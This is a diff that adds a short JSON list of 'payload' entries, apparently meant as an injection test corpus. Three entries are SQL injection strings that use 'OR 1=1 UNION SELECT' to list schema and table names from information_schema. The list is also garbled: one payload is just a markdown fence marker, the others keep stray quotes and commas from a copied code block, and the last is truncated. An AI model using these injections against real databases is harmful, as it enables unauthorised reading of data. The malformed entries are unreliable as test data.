@@ -1,0 +1,18 @@
+[
+    {
+        "id": "a1063ba2-2c02-4954-a049-ba137846a2df",
+        "payload": "```json"
+    },
+    {
+        "id": "fa1ef26f-499a-4495-ae27-dd3fb5850db8",
+        "payload": "  \"' OR 1=1 UNION SELECT 1, schema_name FROM information_schema.schemata #\","
+    },
+    {
+        "id": "1084d98a-bca5-42de-acc3-b0638d1a7416",
+        "payload": "  \"' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database() #\","
+    },
+    {
+        "id": "cc163a8b-8b06-40f8-8c55-91e3c1b141ec",
+        "payload": "  \"' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables"
+    }
+]
